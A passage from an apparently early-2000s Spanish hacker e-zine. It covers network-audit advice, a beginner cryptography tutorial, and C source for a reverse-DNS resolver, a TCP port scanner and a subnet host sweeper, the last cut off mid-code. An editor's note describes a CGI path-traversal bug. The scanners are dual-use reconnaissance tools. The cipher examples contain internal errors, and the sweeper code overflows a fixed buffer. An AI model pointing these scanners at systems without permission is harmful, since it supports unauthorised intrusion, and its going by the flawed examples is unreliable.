Luego  de haber  revisado  que  cosas son  las que se necesitan, toca ver que
estas sean seguras, es decir, nos  toca elegir que  daemons|servicios usamos.
En esto no  puedo decir  mucho.  Hay  bastante de  donde elegir y normalmente
preguntando  por alli siempre saldran recomendaciones de cual es mas seguro o
mas  confiable.  Tambien  toca  estar  un  poco informado, al menos en ambito
general.  Esta bien  por ejemplo  que  no nos decidamos que daemon ftp poner,
pero si  por esas  casualidades de  la vida elegimos el wu-ftpd que  tiene un
historial MUY grande de  vulnerabilidades, luego no tendremos derecho a estar
quejandonos cuando un atacante nos  deje un  lindo mensage ke diga "You suck,
just like your ftpd :D".

Ojo que esto  no corre  solo para  los daemons  de Internet. Hay ke hacer una
revision de cada binario  SUID o SGID  del sistema, de cada proceso que corre
con privilegios elevados y que podria ser riesgoso, y luego buscar en inet si
estos son vulnerables a algun ataque.

Y bueno, despues de  habernos  asegurado  de que  corremos  las  aplicaciones
correctas,  nos toca  la tarea  de revisar que estas esten bien configuradas.
Este punto  es *importantisimo*.  De nada  vale  tenerlo  correcto  si no  lo
usamos correctamente.

Sobre  la  configuracion misma  de los  daemons|servicios nuevamente no puedo
decir  mucho.  Cada  uno es  diferente y se  configura  de diferente  manera.
Algo que si  puedo decir es que siempre tratemos de correrlos con los menores
privilegios  necesarios,  y que busquemos  nuevamente en internet informacion
sobre como configurar  las cosas correctamente. Hay que tener cuidado tambien
con los muchos  daemons|servicios que por defecto traen una configuracion muy
precaria.

Hay ke prestar especial atencion a la configuracion de nuestro server  httpd.
Normalmente  el puerto 80 es uno  de los mas  vulnerables,  esto  debido a la 
normal falta  de  preocupacion  sobre el.  Nuestros CGI's son peligrosos!, no 
dejemos cualkier cosa en el wwwroot.

[NdE: Hace unos meses CDLR aviso a cierto webmaster de un fallo en un cgi que
      usaba para mostrar las paginas. Se le pasaba como parametros una ruta y
      un nombre de archivo. El bug es trivial,  si se ponia la ruta  hacia el
      cgi se podia acceder al fuente del mismo y una vez examinado,  se podia
      ver que aceptaba los famosos /../ por  lo que acceder a  cualquier file
      de la maquina era trivial. Un bug demasiado extendido en Internet.
      Por supuesto, el fallo se soluciono en un par de dias. ]

Y por ultimo, nunca  esta de mas sugerir el uso de herramientas como LIDS [6]
y/o tripwire [7] en nuestros hosts mas sensibles.


----[[ Politicas de usuario ]]

Cuando  tenemos un sistema,  cualkiera  sea su proposito, que sea frecuentado
por usuarios  (shells ?), hace  falta tener todo controlado. Debido a este es
que,  si  no  mantenemos  una politica  de usuarios  correcta,  la  tarea  de
administracion se volvera muy tediosa e insegura.

Pero, ke es una politica de usuario ?
Las politicas de  usuarios son  "reglas" impuestas  en nuestro sistema, tanto
para los usuarios como para los administradores.

Las  reglas para los  usuarios se  aplican para  tener las cosas claras, y en
caso de una violacion, tener una excusa para aplicar las medidas  necesarias.
Por ejemplo,  podemos tener  prohibido el  tener archivos  ejecutables en los
directorios de usuario, o prohibir estar  logeado en mas de una  consola a la
vez si  nuestra makina  tiene pocos  recursos, etc.  Esto depende  mucho  del
proposito del sistema.

Ahora, las  reglas impuestas a  los administradores (que muchas veces seremos
nosotros  mismos  imponiendonos  "auto-reglas"),  son para  mantener  todo en
orden. Por ejemplo, setear un umask razonablemente seguro a cada usuario (man
umask para los que no sepan de que hablo), apuntar los bash_history a nuestro
home, etc.  Reglas  en gerenal  para facilitarnos  el trabajo y mantener todo
seguro.

Ahora, hablar sobre  como debe ser una politica de usuario especificamente es
dificil.  Al  igual ke  la  mayoria de  las  cosas, depende del proposito del
sistema entre otras cosas.

Lo que  si puedo  recomentar son  algunas  cosas  que  normalmente  deben ser
tomadas en  cuenta a la hora de crear nuestra politica (notese que esta no es
una lista  exhaustiva, son  solo algunos ejemplos que se me vienen a la mente
en este momento):

Para los usuarios:
	- umask de los usuarios.
	- Que tipo de archivos tienen permitido tener.
	- Que servicios se les permite usar.
	- Que cantidad de recursos de sistema pueden usar.
	- A donde se pueden conectar (si es que pueden a alguna parte).
	- Horarios de coneccion (si es necesario).
	- Revisar que usen passwords suficientemente buenos.

Para los admins:
	- Organizacion de el sistema (i.e. Donde tener los archivos
	  delicados y cosas asi.).
	- Tener bien claro cuan a menudo hacer  revisiones de sistema  (logs,
	  archivos, suids, etc.).
	- Tener claro el tratamiento de los usuarios (mantener  ordenados los
	  grupos,  ojala  crear grupos  diferentes  para diferentes  tipos de
	  usuarios, etc.).

Y por ultimo, sobre como implementar todo esto, hay 2 maneras. 

La primera es hacerlo mediante software (i.e. Si queremos que los usuarios no
tengan  acceso al exterior, simplemente bloqueamos la salida con algun filtro
como ipchains,  o si queremos que  usen una cierta cantidad de ancho de banda
como maximo, lo implementamos  a nivel de  kernel con QoS  (esto en linux, en
win no se como es, pero seguro habra alguna forma).

La  segunda manera  es implementarlo  mediante  simples  reglas  impuestas al
usuario, por ejemplo poner un mensaje en el motd del sistema, diciendo que no
se  pueden  tener archivos  ejecutables en los homedirs, o diciendo que no se
puede hacer ping desde esta maquina, etc.

Sobre de  que manera  implementar  cada cosa  depende de lo que mas convenga,
tomando en cuenta comodidad, seguridad y eficiencia.


----[[ Firewall ]]

A mi gusto  toda red que pretenda  ser segura debe  contar con algun  tipo de
firewall.  Ya que este  firewall  tambien forma  parte de la red, tambien nos
correspondera auditarlo.

A la hora de auditar  un firewall  no tengo mucho que decir. No conozco mucho
de  firewalls y,  como  vengo  repitiendo  en  muchas  otras  partes  de este
articulo, depende en gran medida de nuestro sistema.

Lo que si puedo  decir es  que una vez que escojamos, segun lo que el sistema
necesite, una configuracion determinada para un firewall, hagamos las pruebas
prudentes para  ver si  esta configuracion  funciona  o si  se nos  fue algun
detalle o editamos algo mal en los archivos de configuracion.


----[[ NIDS ]]

Otra  medida  importante  para  una red es  tener un  NIDS (Network Intrusion
Detection System)  que detecte intentos de penetracion al sistema y nos avise
de ello en una forma rapida y facil, ademas de logear lo que esta haciendo el
atacante.

Un NIDS que capte  todo intento de  intrusion es muy dificil de encontrar. Si
el NIDS es muy  paranoico, nos  dara una alarma de intrusion en  muchos casos
falsa, y por  el contrario,  si es  muy permisivo, muchas veces los atacantes
podran pasar desapercibidos.

Analizar exhaustivamente  los NIDS queda fuera del espectro de este articulo,
pero recomiendo  la lectura de  un exelente  paper que  trata  sobre el tema,
que nos  guiara a la eleccion de el NIDS que mas nos convenga y nos llevara a
ver  las vulnerabilidades  de los NIDS que normalmente los atacantes trataran
de aprovechar. Este paper puede ser encontrado en [8]


----[[ Palabras Finales ]]

Aqui  termina este articulo. Espero que halla  sido del agrado  de todos y ke
halla valido todo el tiempo y la cafeina gastada en hacerlo :).

Aunque lo expuesto aqui solo  es info no-profesional y basada mas que nada en
la experiencia,  creo que  servira  al  menos  como  una  guia  decente  para
ubicarnos un poco en el tema.

Y si  alguna vez  llegas a  implementar  lo expuesto  en este articulo en una
auditoria real, me encantaria recibir comentarios, sugerencias, etc. etc.

Saludos a CDLR,  OverChile,  warez.cl, DarkBlack,  |CodeX| y los muchos otros
ke supongo se me estan olvidando.

teespy


----[[ Referencias ]]

[1]: "Teoria de Firewalling. IPFilter", by DarkBlack,
     www.networking-center.org

[2]: "Cisco IOS Network Address Translation (NAT)",
     www.cisco.com/warp/public/701/60.html

[3]: "The IP Network Adress Translator", by K. Egevang & P. Francis,
     info.internet.isi.edu/in-notes/rfc/files/rfc1631.txt

[4]: Securityfocus, www.securityfocus.com ;
     Packetstorm, packetstorm.securify.com

[5]: "How defaced apache.org",
     packetstorm.securify.com/papers/general/how.defaced.apache.org.txt

[6]: LIDS, Linux Intrusion Detection System, www.lids.org

[7]: Tripwire, www.tripwire.com

[8]: "Insetion, Evasion and Denial of Service: Eluding Network Intrusion
     Detection", by Thomas H. Ptacek,
     packetstorm.securify.com/papers/IDS/ids.ps


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


                      ..--:: 04 Seguridad en Redes ::--..
                                by Tomas Barros

     Introduccion 
     Criptografia 
         · Cifrado por sustitucion 
         · Cifrado por Transposision 
         · Algoritmos inquebrables 
         · Criptografia Moderna 
         · Data Encription Standard (DES) 

Introduccion
------------

Seguridad es un termino que involucra muchos significados en diversos topicos
de nuestras vida. 

En  nuestro  caso  hablaremos  de  seguridad  en  el  ambito  de  protejerse.
Especificamente  en computacion,  podemos protegernos  de fallas de disco, de
intrusos en nuestro sistema, de espias en la red, etc. 

Este articulo  se refiere a la  seguridad en la transmision de datos en redes
conocida como ``Network Security''.  Bajo ningun caso  es la intencion cubrir
todos los aspectos de seguridad que significa estar conectado a una red, sino
exclusivamente a lo que  se refiere en  la transmision de datos; topicos como
protegerse de ataques de  intrusion en  nuestros sistemas, denial of service,
crackers, etc.,  si bien  tambien son  productos  de la red,  estan fuera del
objetivo del documento. 

La  seguridad en  redes la podemos  enfocar desde cuatro  puntos de vista, si
bien ditintos, muy relacionados entre si: 

  1. Confidencialidad 

     Esta se refiere  a mantener la informacion fuera del alcanze de usuarios
     no autorizados. En la practica,  como veremos mas adelante,  consiste en
     mantener la informacion ilegible para usuarios no autorizados. 

  2. Autentificacion 

     En  esta  area consiste  en asegurar el  usuario  con  quien  se  quiere
     establecer una comunicacion es realmente  quien dice ser.  En el caso de
     mensajeria,  como el e-mail,  consiste en  determinar que la informacion
     proviene realmente de quien dice provenir. 

  3. Integridad 

     Consistente  en verificar que  la informacion no  ha sido modificada por
     terceros en camino (mientras viajaba).

  4. No repudacion 

     Esta area, de gran importacia en las transacciones comerciales, consiste
     en que un usuario no pueda denegar una informacion que realmente envio.

Sin hacer mucho  esfuerzo podemos notar que estos cuatro enfoques no son nada
nuevo producto de la computacion sino que ha estado presente  en los sistemas
tradicionales durante toda la historia del ser humano. 

En  lo  que  se  refiere a  confidencialidad por  ejemplo,  es un  tema  casi
instintivo;  ¿quien  no tiene  algo  celosamente  escondido con un acceso muy
restringido a  ciertas personas?,  ¿cuantos, siendo  muy  peque~os,  ciframos
mensajes escritos en la sala de clase?. 

La confidencialidad, entendida como el secreto, tiene dos soluciones: 

 Steganografia: consiste en ocultar la informacion fisicamente o logicamente.

     Seguramente la primera  tecnica que se nos viene a la mente a la hora de
     ocultar algo. Los atiguos militares chinos ocuparon mucho duras tecnicas
     en esta area,  ocultando los  mensajes  dentro  de  los  cuerpos  de los
     mensajeros.  Aunque  parezca  extra~o,  hoy en dia  se utilizan de forma
     efectiva en  la transmision de  datos; algunos  cables  militares  estan
     dentro de  tubos de gas a presion,  la  idea es que  si alguien  intenta
     interceptar la informacion debe abrir el tubo lo que produciria una baja
     de presion lo que permite notar que el canal ya no es seguro. 

 Criptologia: tiene dos areas de estudio:
     
     Criptografia:  consiste  en  usar  tecnicas  para  cifrar (codificar) la
     informacion para hacerla ilegible exepto para ciertos usuarios. 
     
     Criptoanalisis: consiste en descubrir el contenido de un mensaje cifrado
     sin poseer los elementos necesarios para hacerlo. 
          
          
Criptografia 
------------

Esta area tiene una larga historia no carente de controversias. 

Siempre se ha encontrado  una resistencia al uso de esta. En la antigua China
estaba prohibida y sin ir mas  lejos en la actualidad esta muy restringida en
la legislacion  americana y exageradamente  en la francesa.  Las razones y la
discusion en torno  a lo anterior  da para largo,  informacion al respecto se
puede  encontrar   en   el   documento   ``Cryptography   and   Liberty  1999
(http://www.epic.org/reports/crypto1999.html)'' y  en  muchisimos  sitios  de
internet. 

Hay hitos de que la India antigua conocia y utilizaba metodos criptograficos.
En registros  mas recientes tenemos a Julio Cesar,  el gran emperador,  quien
desarrollo  su propio  cifrador para enviar mensajes  con sus  soldados; este
consistia en  desplazarse tres  letras a la derecha en el abecedario, asi por
ejemplo, la letra  ``e'' pasaria a ser ``h''. Es obvio notar que el algoritmo
es sumamente deducible y seguramente no debio ser muy efectivo. 

Probablemente, quien fue el primero en interesarse seriamente en criptografia
fue Alberti (siglo XV), considerado  el padre de  la criptologia  occidental.
Alberti estudio varias formas de criptoanalisis para luego inventar su propio
cifrador conocido como el disco de Alberti mostrado en Figura 1.

	(Fig01.jpg)

La  idea en  Alberti es  reemplazar la letra  interior  por  la exterior.  Se
necesitan  tanto los  discos como la  posicion relativa para poder obtener el
mensaje original. 

Quienes  mas han colaborado  al arte de la  criptografia, sin ser los unicos,
han sido  los militares.  En la criptografia  tradicional los  mensajes a ser
cifrados (encriptados),  comunmente llamados plaintext, son transformados por
una funcion  parametrizada por una llave (key).  El resultado de esta funcion
es  lo  que  se transmite;  aun cuando  un  intruso  lograse  interceptar  la
informacion, este no podra entenderla debido a que no conoce la llave key.

El arte de volver al mensaje  original a partir de uno cifrado sin conocer la
llave es lo que se conoce como criptoanalisis. 

Una  de  las bases que  se debe tener  en cuenta en  criptografia  es que  el
algoritmo  utilizado es  conocido por los criptoanalistas, intrusos, espias o
como se les llame, principalmente por dos razones. 

1. El tiempo  empleado en inventar,  probar e instalar un nuevo cifrador cada
   vez  que  el metodo  viejo es  comprometido  hace  imposible  mantener  la
   confidencialidad de este,  ademas de  ser un gasto de  tiempo innecesario.
   Sumado a  esto, uno  podria creer que un algoritmo es secreto cuando en la
   realidad  no lo es,  lo que definitivamente  es aun mas peligroso que usar
   un algoritmo que sabemos de antemano puede ser violado.
     
2. El otro punto, es que en el hecho de que un algorimo sea publico radica su
   solidez. Al  publicar un  algoritmo,  el  desarrollador  obtendra  un gran
   numero  de  consultorias  gratis  de  academicos   e  investigadores   que
   publicaran papers apuntados a  quebrar el sistema.  Si al cabo  de algunos
   a~os el algoritmo no ha  sido quebrado, probablemente  quiere decir que es
   bastante solido. 

En resumen, la real  confidencialidad radica  en la llave y la complejidad en
su largo. 

Tres son los ataques frecuentes a sistemas criptograficos, cuya resistencia a
estos determinan la solidez del algoritmo. Estos son: 

1. Ataque  por fuerza  bruta:  probar con varias llaves hasta acertar  con la
   correcta. Claramente la fortaleza aumentara con el largo de la llave. 
   
2. Ataque estadistico:  consistente en  determinar  repeticion de  caracteres
   para deducir  el texto  original. La fortaleza de este quedara determinado
   por el tama~o del bloque que se encripta. 
   
3. Ataque  con  textos  conocidos:  dado un  conjunto de  textos  cifrados  y
   originales conocidos, deducir la llave. 

Los  sistemas de cifrado  o encriptacion se  han dividido tradicionalmente en
dos categorias: cifrado por sustitucion y cifrado por transposicion. 


Cifrado por sustitucion 
-----------------------

En el cifrado por sustitucion cada letra o grupo de letras es reemplazado por
otra letra  o un grupo  de letras.  Como  mencionamos  antes,  uno de los mas
antiguos  cifrados por  sustitucion conocido es el empleado por Julius Caesar
quien reemplazaba cada letra por la que se hubicase tres lugares a la derecha
de esta en el abecedario; asi la a se vuelve d, la b en e, etc. 

Uno de los  sistemas mas  basicos es la  sustitucion monoalfabetica, donde se
usa una  llave equivalente  a todas las  letras del  alfabeto,  las cuales se
ordenan aleatoriamente  para formar la llave. Esta llave se contrapone con el
alfabeto  con  la idea  que  al  encriptar se reemplazan  las letras  por  la
contrapuesta. Para recuperar el mensaje original se hace el proceso inverso.

Veamos un ejemplo: 

Sea la llave QWERTYUIOPASDFGHJKLZXCVBNM 

Al contraponerla con el alfabeto nos queda: 

    	A B C D E F G H I J K L M
    	Q W E R T Y U I O P A S D
    	N O P Q R S T U V W X Y Z
    	F G H I J L Z X C V B N M

Probablemante  este   sistema  se  ve   bastante  seguro,  porque  aunque  un
criptoanalista  conociese  el  metodo,  no  conoce  cual  de  las (fig02.jpg)
posibles llaves es la  correcta. Aun cuando intentase  adivinarla  por fuerza
bruta, digamos tomando (fig03.jpg)  por  intento,  tomaria alrededor  de 1013
a~os en probarlas todas. 

Sin embargo,  dado un  bloque de texto cifrado, el criptoanalista podria usar
ataque estadistico.  La letra mas usada en el espa~ol es la letra a, entonces
en  un primer  paso buscamos  la letra  mas repetida  en el  texto  cifrado y
suponemos que es una ``e''; depues seguimos con la segunda letra mas repetida
y la tercera, etc. Despues si es necesario, podemos hacer un analisis en base
al  par de  letras mas repetidas,  el trio, etc.  Finalmente, tambien podemos
tratar de  adivinar palabras  o frases mas  usadas, lo cual  es mas  facil si
sabemos el  contexto del  texto cifrado.  (ej: una  transaccion bancaria, una
carta de amor, etc.). 

Supongamos que tenemos el siguiente texto cifrado: 

LO SQ CORQ ZT RQ SQ TLHQSRQ QUQKKQST TS HGZG 

Como  podemos apreciar  la letra  mas repetida  es la  ``Q'',  por lo  que la
reemplazaremos  por ``a''. Asi  tambien la letra mas repetida que le sigue es
la ``e'', que en nuestro caso la segunda mas repetida es la ``S'';sin embargo
si  reemplazamos la  ``S'' por  ``e'' en la  palabra SQ nos quedara ``ea'' lo
cual no existe en espa~ol. Lo que  si sabemos es que uno de los articulos mas
repetidos en el  espa~ol es  el articulo  ``la''. En nuestro texto cifrado se
repite  dos veces  la palabra SQ  y ademas  cumple la regla  de reemplazar la
``Q''  por  ``a'',  de  donde  podemos suponer  que ``S'' equivale a la letra
``l''. Hagamos los reemplazos hasta ahora. 

LO la CORa ZT Ra la TLHalRa aUaKKalT Tl HGZG 

Ahora podriamos  volver a  usar que la ``e'' es la segunda letra mas repetida
que en este caso  corresponderia a  la ``T''. Ademas  sabemos por la  palabra
``Ra'',  que la ``R'' debe  ser ``d'',  ``h'' o ``v'' que serian las opciones
validas en espa~ol; sin embargo,  al analizar la ``R'' en ``TLHalRQ'' podemos
deducir que la mejor candidata es la letra ``d''. Reemplazando:

LO la CORa Ze da la eLHalda aUaKKale el HGZG. 

Ahora podemos  deducir que  ``eLHalda'' es ``espalda''  y que por lo tanto la
``L'' equivale a ``s'' y la ``H'' a ``p'', con lo que nos quedaria: 

sO la CORa Ze da la espalda aUaKKale el pGZG. 

Si seguimos analizando  descubriremos que la frase original era  ``Si la vida
te da la  espalda,  agarrale el poto''.  Es  cierto  que  existe  una  cierta
ambigüedad  porque en  la frase anterior  la palabra ``te'' podria haber sido
perfectamente ``me'', pero  eso lo podemos  solucionar al ver la gramatica de
la frase.

Como habran  podido  notar,  mientras  mas  grande  es  el  texto cifrado por
sustitucion que poseemos, mas facil sera descifrarlo.             


Cifrado por Transposision 
-------------------------

Los  cifrados  por sustitucion  mantienen  el orden de  las letras del  texto
original  aunque las  reemplaza. En contraste, los cifrados por transposision
reordenan  o  mejor  dicho desordenan  las  letras  del  texto  original  sin
reemplazarlas. 

La  tabla  siguiente  muestra un tipico algoritmo de transposicion utilizando
como llave la palabra AMOR. 

	M U E R T A
	e s t a l a
	e s p e r a
	n z a d e l
	o s a m a n
	t e s

El texto que  se desea encriptar se escribe horizontalmente y hacia abajo, en
el ejemplo el  texto que  queremos  encriptar  es  ``esta la esperanza de los
amantes''.  En este  algoritmo, el  texto se reescribe por columnas partiendo
por la que  tiene la letra  mas baja en la llave y las que siguen. En nuestro
ejemplo debiesemos  partir por  la columna  que empieza por ``A'', para luego
seguir con ``E'', ``M'' , ``R'', ``T'' y ``U''. El texto cifrado nos quedaria
entonces:

	``AALNTPAASEENOTAEDMLREASSZSE''. 

Un criptoanalista,  para descubrir  el texto  original primero debe saber que
esta enfrentado a un cifrado  por transposicion,  lo cual no sera  dificil al
ver las ocurrencias de ``a'', ``e'' y en general de las letras mas usadas del
idioma.  Si estas estan  en igual orden de ocurrencia en el texto cifrado, el
criptoanalista podra concluir que las letras estan en su forma original y que
por lo tanto se esta enfrentando a un cifrado de transposicion. 

Lo siguiente que debiese hacer es adivinar el numero de  columnas. Supongamos
que  el sabe que  la frase  ``la esperanza''  esta dentro  del contenido  del 
mensaje.  Observemos los  pares  ``EN'',  ``SZ'',  ``PA'',  ``ED''  y  ``RE''
producto  del  reorden.  Si  la  llave  hubiese  sido  de  largo 7 se habrian
producido  los pares  ``EZ'' y ``SA''.  Asi,  despues de  algunos intentos el
criptoanalista  puede llegar  a determinar  el largo  de la  llave para luego
encontrar el orden correcto de las columnas lo cual es relativamente facil.


Algoritmos inquebrables 
-----------------------

A  pesar de lo  que se pueda  pensar  de las  llaves anteriores,  dise~ar  un
algoritmo  inquebrable es una  tarea facil  y conocida  hace tiempo. Nosotros
podemos simplemente  generar una llave  aleatoria del mismo largo del texto a
cifrar,  representar  ambos en bits y hacer un EXCLUSIVE OR entre ambos. Este
algoritmo es inquebrable porque cada bit tiene la misma probabilidad de ser 1
o 0 en el texto original. 

Sin embargo,  estos  algoritmos  conocidos como  ``On-time pads''  tienen una
serie de  inconvenientes como que la llave la deben conocer tanto el enviador
como el recibidor o principalmente, que la llave debe ser del largo del texto
que se desea encriptar. 


Criptografia Moderna 
--------------------

La  criptografia  moderna  usa las  mismas  ideas basicas  de  sustitucion  y
transposicion que la tradicional aunque en un uso diferente. Tradicionalmente
se  ha  optado  por  usar  llaves muy  largas y  algoritmos  simples,  en  la
criptografia  moderna se  utilizan llaves relativamente peque~as y algoritmos
complejos  de  forma  que   aunque  el  criptoanalista  pueda   reunir  mucha
informacion y texto cifrado le sea practicamente imposible recuperar el texto
original si no cococe la llave. 

Antes   de   continuar  quisiera   introducir  la   notacion  formal   de  un
criptosistema. Un criptosistema es una tupla (P,C,K,E,D) donde : 

    · P: es un conjunto posibles textos planos 
    · C: es un conjunto de posibles textos cifrados 
    · K: es un conjunto de llaves 
    · E: es un conjunto de funciones que depende de (fig04.jpg)
        (fig05.jpg )
    · D: es un conjunto de funciones que depende de (fig04.jpg)
        (fig06.jpg)                                      
    · Se debe cumplir: 
        (fig07.jpg)
     
En la  definicion anterior  ek corresponde  al cifrador y dk  al  descifrador
donde k puede ser diferente para cada uno. 

A  modo  de  ejemplo  veamos  la definicion  formal  del cifrador  de  Caesar
mencionado anteriormente:      

    · P=C=K=Z26 
    · (fig08.jpg)
    · (fig09.jpg)

Donde para el caso de Caesar k=3. 

Otro ejemplo es la definicion formal de un cifrador por sustitucion: 

     · P=C=Z26 
     · K = Conjunto de permutaciones (fig10.jpg) sobre Z26 
     · (fig11.jpg)
     · (fig12.jpg)


Data Encription Standard (DES) 
------------------------------

A  principios  de  los  70  todo  el  conocimiento   en  criptografia  estaba
concentrado  en  grupos militares:  no existian  publicaciones  y la National
Security Agency (NSA)  negaba su  existencia.  En 1972 el  NBS  (hoy el NIST)
inicio un programa para proteger los computadores y las comunicaciones, el 15
de  Mayo de 1973 el  NBS hizo un llamado a concurso para definir un algoritmo
estandar de cifrado el cual debia cumplir los siguientes requisitos: 

     Alto nivel de seguridad.
     Completamente especificado y facil de entender.
     La seguridad debe descansar en la llave.
     Disponible para todos los usuarios.
     Adaptable a diferentes aplicaciones. 
     Economicamente viable de implementar en dispositivos de Hardware.
     Debia ser eficiente, validable y exportable.

A  pesar de  haber un  gran interes,  ninguna de  las propuestas se considero
suficiente y se hizo  un segundo llamado el 27 de Agosto de 1974. IBM propuso
una variacion de  LUCIFER el que fue enviado a  la NSA para analisis.  La NSA
redujo  la  llave  de 128 a  56 bits  ademas  de  modificar  unas  tablas  de
transformacion usadas por el algoritmo. Se libero la patente. 

En 1975  el algoritmo  fue  publicado para  pedir comentarios,  los cuales no
estuvieron   ajenos  de  controversias,   especialmente  en   cuanto  a   las
modificaciones  de la NSA. Se creia entonces y hasta hoy que la NSA redujo la
llave  e hizo modificaciones  para tener  un back door  o puerta  trasera, es
decir, una formula secreta para poder desencriptar un texto cifrado si la NSA
lo quisiese. 

En  1976,  2 grupos fueron  designados  para  analizar  las  propiedades  del
algoritmo.  El 23 de  Noviembre de 1976  DES fue  adoptado como  el  estandar
federal en USA. 

     DES descripcion formal FIPS PUB 46 (1976) 
     DES modos de operacion FIPS PUB 81 (1980) 
     DES guias de implementacion y uso FIPS PUB 74 (1981) 
     DES para encriptar passwords FIPS PUB 112 
     DES para autentificar datos de computador FIPS PUB 113 

Existen  algunos comentarios  que la NSA nunca  quiso publicar el algoritmo y
que fue un mal entendido entre la NSA y NBS.  El siguiente algoritmo estandar
del gobierno (skipjack) fue clasificado. 

                               
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                    ..--:: 05. Creando fuentes ::--..
                             by Shisei Brujo

                       "We don't need the key"
                       "we'll break in"
                                rage against the machine

                       "Si conoces el sistema"
                       "puedes quebrarlo"
                                Shisei Brujo ;)

Bueno, como  dice el titulo,  en este  articulo nos vamos  a dedicar a  crear
fuentes,  y  aqui  tratare  de  mostrar como  se pueden  ir creando  peque~os 
programas que nos seran de  mucha utilidad al momento de revisar la seguridad
de NUESTRA RED.  Lamentablemente  como  se  ha dicho en muchos articulos, las
herramientas que nos sirven para  verificar  la  seguridad  de  nuestra  red,
tambien serviran para verificar ( sin permiso ) la seguridad de redes ajenas,
convirtiendo a estas  herramientas en  armas de doble filo. Asi que solamente 
ustedes son responsables de lo que hagan con los programas.

Las personas que estan empezando con esto de la programacion, se daran cuenta
que todos  los  grandes programas  estan divididos  en pequeñas  funciones, y 
estas en  otras funciones, etc. o como mostrare a continuacion, hay programas
que usan  caracteristicas de  otros incluidas dentro de ellos. Me explico, en 
la creacion de un auto, se  usan los  focos  ( esas weas  pa iluminar ), pero 
vemos tambien que los  focos  se  pueden  utilizar  de  forma  independiente, 
obviamente no en la forma en que lo encontramos en un auto pero  el resultado
sigue siendo el mismo, iluminar.

Tomando en cuenta esa peque~a parte teorica,  empezaremos a ver los  fuentes,
que es lo que realmente les interesa :(
El primero es un resolvedor de nombres, un programa al que le pasas un numero
de ip, y te devuelve el nombre del servidor.

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>

main(int argc, char *argv[])
{ 
struct hostent *lookup;
char name[255];
unsigned long addr;
if (argc != 2) 
{
printf("Uso: %s <numero de ip>\n", argv[0]);
exit(1); 
} 
if ((addr = inet_addr(argv[1])) == -1) 
{
printf("No se pudo encontrar %s\n", argv[1]);
exit(1); 
}
if ((lookup = gethostbyaddr((char *) &addr,sizeof(long),AF_INET)) != NULL) 
{
printf("%s \t %s\n",argv[1], lookup->h_name);
*lookup->h_addr_list++; 
} 
else
printf("No se pudo encontrar nombre de Host para %s\n",argv[1]);
}

Por si  no se dan  cuenta, no  le puse  explicaciones, y es que este no es un
curso de programacion, y ademas me aburre ponerlas. 
El siguiente  programa es un  archiconocido PortScan, y ustedes diran "por la
mierda,  los portscaners  nos salen  hasta en  la sopa,  cambia  la  caga  de
programa y bla bla bla", pero yo les digo calma, la paciencia es el saber  de 
la ciencia, que despues entenderan porque lo puse ;)

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <netdb.h>
#include <arpa/inet.h>

main(int argc, char *argv[])
{
int sock;
struct sockaddr_in cliente;
struct servent *Descripcion;
struct hostent *lookup;
unsigned long addr;
int puerto;
if ((argc) != 2)
{
printf("Uso: %s <numero de ip>\n", argv[0]);
exit(-1);
}
printf("\n\tScan v2.0 para maquinas con Linux\n");
printf("\t Desarrollado por Shisei Brujo\n\n");
if ((addr=inet_addr(argv[1]))==-1)
{
printf("No se pudo encontrar %s\n", argv[1]);
exit(1);
}
if ((lookup = gethostbyaddr((char *) &addr, sizeof(long), AF_INET)) !=NULL)
{
printf("Escaneando a %s\n", lookup->h_name);
*lookup->h_addr_list++;
}
else
printf("Escaneando a %s\n", argv[1]);
for(puerto=1;puerto<1000;puerto++)
{ 
if ((sock=socket(AF_INET, SOCK_STREAM, 0)) < 0)
{ 
printf ("Error al crear Socket.\n");
exit(-1);
}
cliente.sin_family = AF_INET;
cliente.sin_addr.s_addr = inet_addr(argv[1]);
cliente.sin_port = htons(puerto);
bzero(&(cliente.sin_zero), 8);
Descripcion=getservbyport(htons(puerto), "tcp");
if ((connect(sock, (struct sockaddr*)&cliente, sizeof(cliente))) > -1)
{
printf("Puerto %d %s\n", puerto, (Descripcion==NULL)? "Sin registro":Descripcion->s_name);
}
close(sock);
} 
printf("Trabajo terminado.\n");
}

Por si no se habran  dado cuenta, en  este PortScaner  ocupamos la  funcion o 
mejor dicho el programa de recien para mostrar  el nombre del host,  y ademas
usa  el  archivo  services   para  mostrar  la   descripcion de  los  puertos 
encontrados ( en la funcion getservbyport () )

Ahora continuaremos con un programa que examina una  subred, o sea, tienes un
servidor cualquiera en una direccion 200.200.200.15 con  el nombre  serv.com,
este programa encontrara los demas servidores conectados a este, por ej. 

el 200.200.200.1 de nombre paginas.serv.com
el 200.200.200.2 de nombre servicios.serv.com
....

para usar el programa, 

localhost>./programa 200.200.200

entonces buscara del  ip  200.200.200.1  al  200.200.200.255,  mostrando  los
servidores que esten conectados.

Entienden!, bien bien, entonces al fuente:

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
main(int argc, char *argv[])
{
char ip[15];
int x, y, z;
unsigned long addr;
struct hostent *lookup;
if(argc!=2)
{
printf("Uso: %s <numero de ip>\n", argv[0]);
exit(0);
}
strcpy(ip, argv[1]);
for(x=0;x<3;x++) 
for(y=0;y<10;y++)
for(z=0;z<10;z++)
{
if((x+y+z)>0)
{
if((x==2)&&(y==5)&&(z==6))
{
printf("Trabajo terminado\n");
exit(0);
} 
ip[strlen(ip)]='.';
if((x==0)&&(y==0))
ip[strlen(ip)]=toascii(z+48);
else
if(x==0)
{
ip[strlen(ip)]=toascii(y+48);
ip[strlen(ip)]=toascii(z+48);
}
else
{
ip[strlen(ip)]=toascii(x+48);
ip[strlen(ip)]=toascii(y+48);
ip[strlen(ip)]=toascii(z+48);
}
